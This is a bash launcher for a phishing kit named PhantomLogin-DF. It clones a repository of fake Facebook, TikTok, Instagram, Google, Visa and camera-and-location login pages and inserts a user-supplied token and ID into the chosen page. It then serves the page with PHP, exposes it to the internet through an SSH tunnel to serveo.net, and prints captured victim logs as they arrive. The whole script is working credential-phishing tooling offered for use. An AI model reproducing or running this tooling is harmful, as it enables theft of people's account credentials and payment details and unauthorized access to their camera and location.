#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m'

REPO_URL="https://github.com/MohamedAbuAl-Saud/PhantomLogin-DF.git"
REPO_DIR="PhantomLogin-DF"

show_banner() {
    clear
    echo -e "${BLUE}
    ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
    ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
    ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
    ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
    ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
    ${NC}"
    echo -e "${YELLOW}-----------------------------------------------------------------------------------"
    echo -e "[+] Tool      : PhantomLogin-DF"
    echo -e "[+] Version   : 2.0"
    echo -e "[+] Coder     : @A_Y_TR"
    echo -e "[+] Channel   : https://t.me/cybersecurityTemDF"
    echo -e "-----------------------------------------------------------------------------------${NC}"
}

install_dependencies() {
    echo -e "${GREEN}[+] Checking and installing dependencies...${NC}"
    if ! command -v php &> /dev/null; then
        echo -e "${YELLOW}[+] PHP is not installed. Installing PHP...${NC}"
        sudo apt-get install php -y || { echo -e "${RED}[-] Failed to install PHP.${NC}"; exit 1; }
    fi
    if ! command -v ssh &> /dev/null; then
        echo -e "${YELLOW}[+] SSH is not installed. Installing SSH...${NC}"
        sudo apt-get install openssh-client -y || { echo -e "${RED}[-] Failed to install SSH.${NC}"; exit 1; }
    fi
    if ! command -v jq &> /dev/null; then
        echo -e "${YELLOW}[+] jq is not installed. Installing jq...${NC}"
        sudo apt-get install jq -y || { echo -e "${RED}[-] Failed to install jq.${NC}"; exit 1; }
    fi
    echo -e "${GREEN}[+] All dependencies are installed.${NC}"
}

clone_repo() {
    if [[ -d "$REPO_DIR" ]]; then
        echo -e "${YELLOW}[+] Repository already exists. Updating...${NC}"
        cd "$REPO_DIR" || { echo -e "${RED}[-] Failed to enter repository directory.${NC}"; exit 1; }
        git pull origin main || { echo -e "${RED}[-] Failed to update repository.${NC}"; exit 1; }
        cd ..
    else
        echo -e "${GREEN}[+] Cloning repository...${NC}"
        if ! git clone "$REPO_URL" "$REPO_DIR"; then
            echo -e "${RED}[-] Failed to clone repository. Please check your internet connection.${NC}"
            exit 1
        fi
        echo -e "${GREEN}[+] Repository cloned successfully.${NC}"
    fi
}

start_local_server() {
    echo -e "${GREEN}[+] Starting PHP server on localhost...${NC}"
    php -S localhost:3333 > /dev/null 2>&1 &
    php_pid=$!
    echo -e "${GREEN}[+] PHP server started at http://localhost:3333/${page}.html${NC}"
    echo -e "${YELLOW}[+] Press Ctrl+C to stop the server.${NC}"
    trap "kill $php_pid 2> /dev/null" EXIT
    while true; do
        sleep 1
    done
}

start_serveo_server() {
    echo -e "${GREEN}[+] Starting PHP server on localhost...${NC}"
    php -S localhost:3333 > /dev/null 2>&1 &
    php_pid=$!
    echo -e "${GREEN}[+] PHP server started at http://localhost:3333/${page}.html${NC}"

    echo -e "${GREEN}[+] Starting SSH tunnel with Serveo...${NC}"
    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net > sendlink 2>&1 &
    ssh_pid=$!
    sleep 8

    echo -e "${GREEN}[+] Fetching Serveo URL...${NC}"
    serveo_url=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    if [[ -z "$serveo_url" ]]; then
        echo -e "${RED}[-] Failed to start Serveo.net. Please make sure SSH is installed and try again.${NC}"
        exit 1
    fi

    echo -e "${GREEN}[+] Serveo URL: ${serveo_url}/${page}.html${NC}"
    echo -e "${YELLOW}[+] Press Ctrl+C to stop the server.${NC}"

    trap "kill $php_pid $ssh_pid 2> /dev/null" EXIT
    while true; do
        sleep 1
    done
}

display_logs() {
    echo -e "${YELLOW}[+] Waiting for targets... Press Ctrl+C to exit.${NC}"
    while true; do
        if [[ -e "log.txt" ]]; then
            echo -e "${GREEN}[+] New log entry found!${NC}"
            echo -e "${BLUE}----------------------------------------${NC}"
            cat log.txt
            echo -e "${BLUE}----------------------------------------${NC}"
            mv log.txt "log_$(date +%Y%m%d_%H%M%S).txt"
        fi
        sleep 1
    done
}

show_menu() {
    echo -e "${GREEN}Welcome to PhantomLogin${NC}"
    echo -e "${YELLOW}=================================${NC}"
    echo -e "${BLUE}1. Facebook login${NC}"
    echo -e "${BLUE}2. Tik tok login${NC}"
    echo -e "${BLUE}3. Instagram login${NC}"
    echo -e "${BLUE}4. Google login${NC}"
    echo -e "${BLUE}5. Visa login${NC}"
    echo -e "${BLUE}6. Camera and location${NC}"
    echo -e "${YELLOW}=================================${NC}"
}

show_banner
install_dependencies
clone_repo

echo -e "${GREEN}[+] Enter Token:${NC}"
read token
echo -e "${GREEN}[+] Enter ID:${NC}"
read id

show_menu

echo -e "${GREEN}[+] Choose the page you want to phish:${NC}"
read choice

case $choice in
    1)
        page="Facebook_login"
        ;;
    2)
        page="TikTok_login"
        ;;
    3)
        page="Instagram_login"
        ;;
    4)
        page="Google_login"
        ;;
    5)
        page="Visa_login"
        ;;
    6)
        page="CameraAndLocation_login"
        ;;
    *)
        echo -e "${RED}[-] Invalid choice. Please select a valid option.${NC}"
        exit 1
        ;;
esac

if [[ ! -f "$REPO_DIR/${page}.html" ]]; then
    echo -e "${RED}[-] File ${page}.html not found in the repository.${NC}"
    exit 1
fi

# Inject token and ID into the page
sed -i "s/TOKEN_PLACEHOLDER/$token/g" "$REPO_DIR/${page}.html"
sed -i "s/ID_PLACEHOLDER/$id/g" "$REPO_DIR/${page}.html"
cp "$REPO_DIR/${page}.html" .

echo -e "${GREEN}[+] Choose server type:${NC}"
echo -e "${BLUE}1. Localhost${NC}"
echo -e "${BLUE}2. Serveo.net${NC}"
read server_choice

case $server_choice in
    1)
        start_local_server
        ;;
    2)
        start_serveo_server
        ;;
    *)
        echo -e "${RED}[-] Invalid choice. Please select a valid option.${NC}"
        exit 1
        ;;
esac

display_logs
